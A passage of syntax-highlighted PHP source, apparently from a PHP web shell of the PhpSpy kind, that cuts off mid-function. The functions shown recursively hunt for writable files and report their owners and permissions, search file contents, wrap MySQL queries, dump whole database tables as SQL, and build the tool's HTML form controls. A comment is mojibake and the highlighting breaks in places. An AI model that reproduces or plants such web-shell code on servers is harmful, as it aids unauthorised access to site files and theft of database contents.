            <span class="nv">$f</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;//&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$dir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">)){</span>
                <span class="nx">GetWFileList</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">is_file</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$writabledb</span><span class="p">))){</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">sizecount</span><span class="p">(</span><span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$f</span><span class="p">));</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;mtime&#39;</span><span class="p">]</span><span class="o">=@</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$f</span><span class="p">));</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;filechmod&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getChmod</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;fileperm&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getPerms</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;fileowner&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getUser</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;dirlink&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$dir</span><span class="p">;</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$f</span><span class="p">;</span>
                    <span class="nv">$j</span><span class="o">++</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
        <span class="nb">clearstatcache</span><span class="p">();</span>
        <span class="k">return</span> <span class="nv">$filedata</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">GetSFileList</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$re</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$filedata</span><span class="p">,</span><span class="nv">$j</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">,</span> <span class="nv">$writabledb</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$j</span> <span class="o">&amp;&amp;</span> <span class="nv">$j</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$dh</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">getext</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
            <span class="nv">$f</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;//&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$dir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">)){</span>
                <span class="nx">GetSFileList</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$re</span> <span class="o">=</span> <span class="mi">0</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">is_file</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$writabledb</span><span class="p">))){</span>
                <span class="nv">$find</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$re</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)</span> <span class="o">||</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;@&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">){</span>
                        <span class="nv">$find</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span> <span class="nb">strstr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$content</span><span class="p">)</span> <span class="o">||</span> <span class="nb">strstr</span><span class="p">(</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$f</span><span class="p">),</span><span class="nv">$content</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$find</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$find</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">sizecount</span><span class="p">(</span><span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$f</span><span class="p">));</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;mtime&#39;</span><span class="p">]</span><span class="o">=@</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$f</span><span class="p">));</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;filechmod&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getChmod</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;fileperm&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getPerms</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;fileowner&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">getUser</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;dirlink&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$dir</span><span class="p">;</span>
                    <span class="nv">$filedata</span><span class="p">[</span><span class="nv">$j</span><span class="p">][</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$f</span><span class="p">;</span>
                    <span class="nv">$j</span><span class="o">++</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
        <span class="nb">clearstatcache</span><span class="p">();</span>
        <span class="k">return</span> <span class="nv">$filedata</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">qy</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span> <span class="p">{</span> 
    <span class="k">global</span> <span class="nv">$mysqllink</span><span class="p">;</span>
    <span class="c1">//echo $sql.&#39;&amp;lt;br&amp;gt;&#39;;</span>
    <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span><span class="nv">$mysqllink</span><span class="p">))</span> <span class="p">{</span> 
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> 
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
    <span class="p">}</span>    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">q</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span> <span class="p">{</span> 
    <span class="k">global</span> <span class="nv">$mysqllink</span><span class="p">;</span>
    <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span><span class="nv">$mysqllink</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">fr</span><span class="p">(</span><span class="nv">$qy</span><span class="p">){</span>
    <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$qy</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">sizecount</span><span class="p">(</span><span class="nv">$fileSize</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$size</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">&quot;%u&quot;</span><span class="p">,</span> <span class="nv">$fileSize</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s1">&#39;0 Bytes&#39;</span> <span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$sizename</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39; Bytes&#39;</span><span class="p">,</span> <span class="s1">&#39; KB&#39;</span><span class="p">,</span> <span class="s1">&#39; MB&#39;</span><span class="p">,</span> <span class="s1">&#39; GB&#39;</span><span class="p">,</span> <span class="s1">&#39; TB&#39;</span><span class="p">,</span> <span class="s1">&#39; PB&#39;</span><span class="p">,</span> <span class="s1">&#39; EB&#39;</span><span class="p">,</span> <span class="s1">&#39; ZB&#39;</span><span class="p">,</span> <span class="s1">&#39; YB&#39;</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">round</span><span class="p">(</span> <span class="nv">$size</span> <span class="o">/</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nb">floor</span><span class="p">(</span><span class="nb">log</span><span class="p">(</span><span class="nv">$size</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)))),</span> <span class="mi">2</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$sizename</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
<span class="p">}</span>
<span class="c1">// ±¸·ÝÊý¾Ý¿â</span>
<span class="k">function</span> <span class="nf">sqldumptable</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span> <span class="nv">$fp</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$mysqllink</span><span class="p">;</span>

    <span class="nv">$tabledump</span> <span class="o">=</span> <span class="s2">&quot;DROP TABLE IF EXISTS `</span><span class="si">$table</span><span class="s2">`;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;SHOW CREATE TABLE </span><span class="si">$table</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="nv">$create</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
    <span class="nv">$tabledump</span> <span class="o">.=</span> <span class="nv">$create</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$tabledump</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nv">$tabledump</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$tabledump</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nv">$rows</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM </span><span class="si">$table</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$rows</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$row</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.@</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$tabledump</span> <span class="o">=</span> <span class="s1">&#39;INSERT INTO `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;` VALUES (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$row</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$tabledump</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="nv">$tabledump</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="nx">fr</span><span class="p">(</span><span class="nv">$rows</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">p</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
    <span class="k">echo</span> <span class="nv">$str</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">tbhead</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot;&amp;gt;&#39;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">tbfoot</span><span class="p">(){</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/table&amp;gt;&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">makehide</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>
    <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input id=</span><span class="se">\&quot;</span><span class="si">$name\</span><span class="s2">&quot;</span> <span class="nx">type</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="si">$name\</span><span class="s2">&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$value\</span><span class="s2">&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">}</span>

<span class="s2">function makeinput(</span><span class="si">$arg</span><span class="s2"> = array()){</span>
<span class="s2">   </span><span class="si">$arg[&#39;size&#39;]</span><span class="s2"> = </span><span class="si">$arg[&#39;size&#39;]</span><span class="s2"> &amp;gt; 0 ? &quot;</span><span class="nx">size</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$arg[size]</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">:</span> <span class="s2">&quot;size=</span><span class="se">\&quot;</span><span class="s2">100</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;extra&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;extra&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;extra&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;text&#39;</span><span class="p">;</span>
    <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br /&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;class&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;class&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;class&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;input&#39;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;newline&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;&amp;lt;p&amp;gt;</span><span class="si">$arg[title]</span><span class="s2">&amp;lt;input class=</span><span class="se">\&quot;</span><span class="si">$arg[class]</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="si">$arg[name]</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="si">$arg[name]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="si">$arg[value]</span><span class="se">\&quot;</span><span class="s2"> type=</span><span class="se">\&quot;</span><span class="si">$arg[type]</span><span class="se">\&quot;</span><span class="s2"> </span><span class="si">$arg[size]</span><span class="s2"> </span><span class="si">$arg[extra]</span><span class="s2"> /&amp;gt;&amp;lt;/p&amp;gt;&quot;</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$arg[title]</span><span class="s2">&amp;lt;input class=</span><span class="se">\&quot;</span><span class="si">$arg[class]</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="si">$arg[name]</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="si">$arg[name]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="si">$arg[value]</span><span class="se">\&quot;</span><span class="s2"> type=</span><span class="se">\&quot;</span><span class="si">$arg[type]</span><span class="se">\&quot;</span><span class="s2"> </span><span class="si">$arg[size]</span><span class="s2"> </span><span class="si">$arg[extra]</span><span class="s2"> /&amp;gt;&quot;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">makeselect</span><span class="p">(</span><span class="nv">$arg</span> <span class="o">=</span> <span class="k">array</span><span class="p">()){</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;onchange&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="nv">$onchange</span> <span class="o">=</span> <span class="s1">&#39;onchange=&quot;&#39;</span><span class="o">.</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;onchange&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&quot;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;newline&#39;</span><span class="p">])</span> <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$arg[title]</span><span class="s2"> &amp;lt;select class=</span><span class="se">\&quot;</span><span class="s2">input</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="si">$arg[name]</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="si">$arg[name]</span><span class="se">\&quot;</span><span class="s2"> </span><span class="si">$onchange</span><span class="s2">&amp;gt;&quot;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;option&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;nokey&#39;</span><span class="p">])</span> <span class="p">{</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;option&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;selected&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="si">$value\</span><span class="s2">&quot;</span> <span class="nx">selected</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$value</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">option</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">                   } else {</span>
<span class="s2">                       p(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">option</span> <span class="nx">value</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$value\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$value</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">option</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">                   }</span>
<span class="s2">               }</span>
<span class="s2">           } else {</span>
<span class="s2">               foreach (</span><span class="si">$arg[&#39;option&#39;]</span><span class="s2"> as </span><span class="si">$key</span><span class="s2">=&amp;gt;</span><span class="si">$value</span><span class="s2">) {</span>
<span class="s2">                   if (</span><span class="si">$arg[&#39;selected&#39;]</span><span class="s2">==</span><span class="si">$key</span><span class="s2">) {</span>
<span class="s2">                       p(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">option</span> <span class="nx">value</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$key\</span><span class="s2">&quot;</span> <span class="nx">selected</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$value</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">option</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">                   } else {</span>
